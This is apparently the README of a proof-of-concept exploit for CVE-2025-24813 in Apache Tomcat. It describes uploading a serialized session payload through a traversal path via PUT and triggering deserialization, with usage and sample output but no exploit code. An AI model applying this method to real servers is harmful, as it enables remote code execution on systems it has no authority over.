# CVE-2025-24813 Apache Tomcat RCE PoC
Proof of Concept (PoC) exploiting CVE-2025-24813, a Remote Code Execution (RCE) vulnerability in Apache Tomcat. The vulnerability allows an attacker to upload a malicious serialized payload to the server, leading to arbitrary code execution via deserialization when specific conditions are met.
---

## Description

**CVE-2025-24813** is a theoretical RCE vulnerability in Apache Tomcat that leverages improper handling of uploaded session files and deserialization mechanisms. By uploading a crafted payload to a writable directory (e.g., `/uploads/../sessions/`), an attacker can trigger deserialization, resulting in the execution of arbitrary commands on the target server.

---

## Prerequisites for Successful Exploitation

For this PoC to successfully exploit the vulnerability, the following conditions must be met:

1. **Apache Tomcat Version**: The target must be running a vulnerable version of Apache Tomcat.
2. **Writable Directory**: The server must allow PUT requests
3. **Deserialization Trigger**: The server must process the uploaded session file (e.g., via a GET request to `/index.jsp`) and trigger deserialization of the payload.
4. **Java Environment**: The attacker’s machine must have Java installed to generate payloads using `ysoserial` or compile Java-based payloads.
5. **ysoserial (Optional)**: If using the `ysoserial` payload type, the `ysoserial.jar` file must be available locally.

---

```
python CVE-2025-24813.py <target_url> [options]
```

## Output
* Successful Exploit:
```
[+] Server is writable via PUT: http://localhost:8081/check.txt
[*] Session ID: absholi7ly
[+] Payload generated successfully: payload.ser
[+] Payload uploaded with status 409 (Conflict): http://localhost:8081/uploads/../sessions/absholi7ly.session
[+] Exploit succeeded! Server returned 500 after deserialization.
[+] Target http://localhost:8081 is vulnerable to CVE-2025-24813!
[+] Temporary file removed: payload.ser
```

* Failed Exploit:
```
[+] Server is writable via PUT: http://localhost:8081/check.txt
[*] Session ID: absholi7ly
[+] Payload generated successfully: payload.ser
[-] Payload upload failed: http://localhost:8081/uploads/../sessions/absholi7ly.session (HTTP 403)
[-] Target http://localhost:8081 does not appear vulnerable or exploit failed.
[+] Temporary file removed: payload.ser
```
